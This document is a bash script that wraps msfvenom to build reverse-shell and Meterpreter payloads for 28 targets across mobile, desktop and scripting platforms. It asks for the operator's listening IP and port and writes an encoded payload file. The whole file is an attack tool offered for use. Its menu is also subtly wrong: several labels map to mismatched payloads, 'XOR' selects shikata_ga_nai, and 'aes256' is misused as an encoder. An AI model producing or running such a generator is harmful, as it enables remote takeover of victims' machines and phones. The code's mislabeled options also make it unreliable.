#!/bin/bash

# Prompt user for input
read -p "Enter your local IP: " LHOST
read -p "Enter your local port: " LPORT

# Provide options for payload types
echo "Choose a payload type:"
echo "1. Android reverse shell"
echo "2. Android meterpreter reverse TCP"
echo "3. Windows reverse shell"
echo "4. Linux reverse shell"
echo "5. Mac reverse shell"
echo "6. PHP reverse shell"
echo "7. Python reverse shell"
echo "8. Perl reverse shell"
echo "9. Ruby reverse shell"
echo "10. Powershell reverse shell"
echo "11. Windows Meterpreter reverse TCP"
echo "12. Linux Meterpreter reverse TCP"
echo "13. Mac Meterpreter reverse TCP"
echo "14. Android Meterpreter reverse TCP"
echo "15. PHP Meterpreter reverse TCP"
echo "16. Python Meterpreter reverse TCP"
echo "17. Perl Meterpreter reverse TCP"
echo "18. Ruby Meterpreter reverse TCP"
echo "19. Powershell Meterpreter reverse TCP"
echo "20. Windows Meterpreter reverse HTTPS"
echo "21. Linux Meterpreter reverse HTTPS"
echo "22. Mac Meterpreter reverse HTTPS"
echo "23. Android Meterpreter reverse HTTPS"
echo "24. PHP Meterpreter reverse HTTPS"
echo "25. Python Meterpreter reverse HTTPS"
echo "26. Perl Meterpreter reverse HTTPS"
echo "27. Ruby Meterpreter reverse HTTPS"
echo "28. Powershell Meterpreter reverse HTTPS"
read -p "Enter your choice (1-28): " CHOICE

# Set payload based on user's choice
case $CHOICE in
    1) PAYLOAD="android/shell_reverse_tcp";;
    2) PAYLOAD="android/meterpreter/reverse_tcp";;
    3) PAYLOAD="windows/shell_reverse_tcp";;
    4) PAYLOAD="linux/x86/shell_reverse_tcp";;
    5) PAYLOAD="osx/x86/shell_reverse_tcp";;
    6) PAYLOAD="php/reverse_php";;
    7) PAYLOAD="python/meterpreter_reverse_tcp";;
    8) PAYLOAD="cmd/unix/reverse_perl";;
    9) PAYLOAD="cmd/unix/reverse_ruby";;
    10) PAYLOAD="windows/powershell_reverse_tcp";;
    11) PAYLOAD="windows/meterpreter/reverse_tcp";;
    12) PAYLOAD="linux/x86/meterpreter_reverse_tcp";;
    13) PAYLOAD="osx/x86/meterpreter_reverse_tcp";;
    14) PAYLOAD="android/meterpreter/reverse_tcp";;
    15) PAYLOAD="php/meterpreter_reverse_tcp";;
    16) PAYLOAD="python/meterpreter_reverse_tcp";;
    17) PAYLOAD="cmd/unix/reverse_perl";;
    18) PAYLOAD="cmd/unix/reverse_ruby";;
    19) PAYLOAD="windows/meterpreter/reverse_tcp";;
    20) PAYLOAD="windows/meterpreter/reverse_https";;
    21) PAYLOAD="linux/x86/meterpreter/reverse_https";;
    22) PAYLOAD="osx/x86/meterpreter/reverse_https";;
    23) PAYLOAD="android/meterpreter/reverse_https";;
    24) PAYLOAD="php/meterpreter/reverse_https";;
    25) PAYLOAD="python/meterpreter/reverse_https";;
    26) PAYLOAD="cmd/unix/reverse_perl";;
    27) PAYLOAD="cmd/unix/reverse_ruby";;
    28) PAYLOAD="windows/meterpreter/reverse_https";;
    *) echo "Invalid choice. Exiting."; exit 1;;
esac

# Provide options for encryption algorithms
echo "Choose an encryption algorithm:"
echo "1. AES256"
echo "2. XOR"
read -p "Enter your choice (1-2): " ENCRYPTION_CHOICE

# Set encryption format based on user's choice
case $ENCRYPTION_CHOICE in
    1) ENCODING="raw"; ENCODE_FORMAT="aes256";;
    2) ENCODING="raw"; ENCODE_FORMAT="x86/shikata_ga_nai";;
    *) echo "Invalid choice. Exiting."; exit 1;;
esac

# Prompt user for output filename
read -p "Enter output filename: " OUTPUT_FILE

# Generate payload
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f raw -e $ENCODE_FORMAT -o $OUTPUT_FILE

echo "Payload successfully generated."
